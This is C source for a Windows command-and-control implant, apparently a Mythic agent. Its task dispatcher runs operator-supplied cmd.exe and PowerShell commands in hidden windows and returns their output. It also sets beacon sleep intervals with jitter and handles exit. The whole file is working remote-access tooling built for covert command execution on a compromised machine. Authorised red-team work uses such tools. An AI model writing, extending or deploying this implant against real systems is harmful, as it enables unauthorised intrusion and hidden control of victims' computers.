#include "common.h"
#include "mythic.h"
#include "tasks.h"

/* Run `prog /c arg`, capture combined output (caller frees). */
static char *run_capture(const char *prog, const char *arg, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rfd = NULL, wfd = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char cmd[8192], *out = NULL;
    size_t len = 0, cap = 0;
    DWORD got = 0;
    *exit_code = -1;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rfd, &wfd, &sa, 0))
        return NULL;
    if (!SetHandleInformation(rfd, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = wfd;
    si.hStdError = wfd;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));
    snprintf(cmd, sizeof(cmd), "%s /c %s", prog, arg ? arg : "");
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    CloseHandle(wfd);
    CloseHandle(pi.hThread);
    out = (char *)malloc(4096);
    if (!out) {
        CloseHandle(rfd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    cap = 4096;
    for (;;) {
        if (len + 1024 > cap) {
            char *grown = (char *)realloc(out, cap * 2);
            if (!grown)
                break;
            out = grown;
            cap *= 2;
        }
        if (!ReadFile(rfd, out + len, 1023, &got, NULL) || got == 0)
            break;
        len += got;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        *exit_code = (int)code;
    }
    CloseHandle(rfd);
    CloseHandle(pi.hProcess);
    out[len] = '\0';
    return out;
}

/* Parse "interval [jitter]". */
static int parse_sleep(const char *arg, int *interval, int *jitter) {
    char *end = NULL;
    long iv, jt = 0;
    if (!arg || *arg == '\0')
        return -1;
    iv = strtol(arg, &end, 10);
    if (end == arg || iv < 0 || iv > 8640000)
        return -1;
    while (*end == ' ' || *end == '\t')
        end++;
    if (*end != '\0') {
        jt = strtol(end, &end, 10);
        if (jt < 0 || jt > 100)
            return -1;
    }
    *interval = (int)iv;
    *jitter = (int)jt;
    return 0;
}

int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, int *exit_now) {
    char scratch[8192];
    const char *arg;
    *output = NULL;
    *exit_now = 0;
    resp->task_id = t->id;
    resp->user_output = "";
    resp->completed = 1;
    resp->status = "success";
    arg = task_arg(t->parameters, scratch, sizeof(scratch));
    if (strcmp(t->command, "shell") == 0) {
        int code = 0;
        *output = run_capture("cmd.exe", arg, &code);
        if (!*output) {
            resp->status = "error: exec failed";
            return 0;
        }
        resp->user_output = *output;
        if (code != 0)
            resp->status = "error: non-zero exit";
        return 0;
    }
    if (strcmp(t->command, "powershell") == 0) {
        int code = 0;
        *output = run_capture("powershell.exe", arg, &code);
        if (!*output) {
            resp->status = "error: exec failed";
            return 0;
        }
        resp->user_output = *output;
        if (code != 0)
            resp->status = "error: non-zero exit";
        return 0;
    }
    if (strcmp(t->command, "sleep") == 0) {
        int iv = 0, jt = 0;
        if (parse_sleep(arg, &iv, &jt) != 0) {
            resp->status = "error: usage: sleep <interval> [jitter]";
            resp->user_output = resp->status;
            return 0;
        }
        a->interval = iv;
        a->jitter = jt;
        *output = (char *)malloc(64);
        if (*output) {
            snprintf(*output, 64, "sleep set to %ds jitter %d%%", iv, jt);
            resp->user_output = *output;
        }
        return 0;
    }
    if (strcmp(t->command, "exit") == 0) {
        resp->user_output = "exiting";
        *exit_now = 1;
        return 0;
    }
    resp->status = "error: unknown command";
    resp->user_output = resp->status;
    return 0;
}

void task_sleep(int interval, int jitter) {
    int ms, delta, low, span;
    if (interval <= 0)
        return;
    if (jitter <= 0) {
        Sleep((DWORD)interval * 1000);
        return;
    }
    delta = interval * jitter / 100;
    low = interval - delta;
    if (low < 0)
        low = 0;
    span = interval + delta - low;
    ms = low + (span > 0 ? rand() % (span + 1) : 0);
    Sleep((DWORD)ms * 1000);
}
